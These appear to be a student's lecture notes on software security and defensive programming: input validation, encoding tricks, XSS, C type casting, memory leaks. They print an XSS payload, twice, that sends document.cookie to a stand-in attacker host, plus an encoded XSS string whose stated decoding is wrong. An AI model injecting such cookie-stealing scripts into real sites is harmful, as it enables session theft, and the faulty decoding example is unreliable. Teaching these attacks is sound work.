# Software Security
Preventing vulnerabilities is the best fix available.
However that's not always possible because developers sometimes are monkeys (*me included*).
**Software security** is the practice to write **safe code** and handling correctly I/O to prevent vulnerabilities to occur.
## Terminology
- Prevention
  Improved methods for specifying and building software.
- Detection
  Efficient testing techniques.
- Mitigation
  Resilient architecture, *see defense in depth.*
## CWE TOP 10
A list of the most dangerous and common vulnerabilities.
## Defensive programming
Designing and implementing software so that it **keeps working** even under attack; it should detect erroneous conditions (attack attempts) and either:
- Fail gracefully
- Keep working **safely**
Usually developers focus on *the shit is working*, instead of *the shit is safe*.
Translating this: 
Developers **focus on steps for success** rather than considering all
possible points of failures. Security is not granted, it can't be achieved if not in the design.
Defensive programming requires knowledge and awareness of what happens if a system is vulnerable, common attack techniques.
### Golden rule for defensive programming
Don't assume anything and handle error states.
# How to do defensive programming
## Handle program input
As previously said, don't assume the validity of input.
**Check the constraints and the validity of input** (e.g. check the array size, an array of size -123168 is *probably* invalid).
### Input interpreting
Sometimes, different charset mess things up.
An input like `hello%2Fscript%3Ealert(1)%3Cscript` might bypass input validation but execute as `<script>alert(1)</script>` after decoding.
### What happens if this step fails
The attacker injects a malicious payload to affect the flow of execution (expected behavior) of the program, sounds like [[Lezione10#SQL Injection|SQL Injection]].
Other type of attack include:
- Code injection (shell-codes)
- File inclusion attacks
### Cross-site scripting (XSS)
Browser usually limit script access to pages that belong to the same site; however that content is trusted. What if an user can post a malicious snippet of code and make it render on the page? *Disaster*
Example: a comment like
```html
Thanks for this information, it’s great! 
<script>
document.location='http://hacker.web.site/cookie.cgi?'+document.cookie 
</script>
```
Well shit, what can a developer do?
- Whitelist/Blacklist mechanism
  Allow only specified set of characters/words, often by using regular expressions (regex).
## Writing safe code
Writing correct implementations, like a proper random number generator.
- Use strongly typed languages when possible, they ensure data consistency. C is funny but it leads to **too much freedom**, example:
```c
int main() {
    // Declare a function pointer
    void (*func_ptr)() = (void (*)())&func_ptr;

    // Call the "function"
    func_ptr();

    return 0;
}
```
Basically you can cast anything to everything (a dog can be a cat, crazy.)
Data should be interpreted consistently to prevent inappropriate
manipulation, leading to flaws/bugs like the previous code. These bugs might be exploited to crash the program or subvert execution.
### Correctly using memory
Programs often allocate memory on the heap. Memory should be released when the tasks have been performed. Else, a memory leak can happen, that is: incorrect use of memory might steadily increase memory allocation, exhausting it.
## Handling interaction
**Environment variables**: a collection of string values inherited by each process from its parent that can affect the way a running process behaves.

--- 
# Summary
## Overview
Software security involves writing **safe code** and correctly handling input/output to prevent vulnerabilities. While preventing vulnerabilities is ideal, it requires proactive measures in design, implementation, and maintenance.
## Key Terminology
1. **Prevention**: Techniques to specify and build secure software.
2. **Detection**: Effective testing methods to find vulnerabilities.
3. **Mitigation**: Building resilient architectures (e.g., defense in depth).
## CWE Top 10
A list of the most dangerous and common software vulnerabilities, highlighting key areas where developers should focus.
## Defensive Programming
### Principles
- Software must continue to work safely, even under attack.
- Detect erroneous conditions (e.g., attacks) and either:
  - Fail gracefully.
  - Operate securely.
### Common Developer Mindset
- Developers often prioritize functionality ("it works") over security ("it’s safe").
- Defensive programming demands anticipation of failures and awareness of vulnerabilities.
### Golden Rule
**Do not assume anything**; handle all potential error states.
## How to Implement Defensive Programming
### 1. Handle Program Input
- Always validate inputs for constraints and correctness (e.g., array size must be valid).
#### Input Interpreting
- Encoding mismatches can bypass validation (e.g., `hello%2Fscript%3Ealert(1)%3Cscript` decoding to `<script>alert(1)</script>`).
#### Consequences of Failure
- Vulnerabilities such as:
  - **Code Injection**: Arbitrary code execution.
  - **File Inclusion Attacks**: Inserting malicious files.
  - **Cross-Site Scripting (XSS)**: Malicious scripts rendered on trusted pages.
    - Example:
      ```html
      <script>
      document.location='http://hacker.web.site/cookie.cgi?'+document.cookie
      </script>
      ```
    - **Countermeasure**: Use whitelisting/blacklisting mechanisms (e.g., regular expressions).
### 2. Writing Safe Code
- Use strongly typed languages to ensure data consistency.
- Avoid risky constructs (e.g., casting pointers in C):
  ```c
  int main() {
      void (*func_ptr)() = (void (*)())&func_ptr;
      func_ptr();
      return 0;
  }
```
#### Memory Management
- Release memory after use to prevent **memory leaks**.
- Improper memory handling can lead to exhaustion or exploitation.
### Handling Interaction
- **Environment Variables**:
    - Inherited by processes and influence program behavior.
    - Handle them securely to prevent unintended modifications.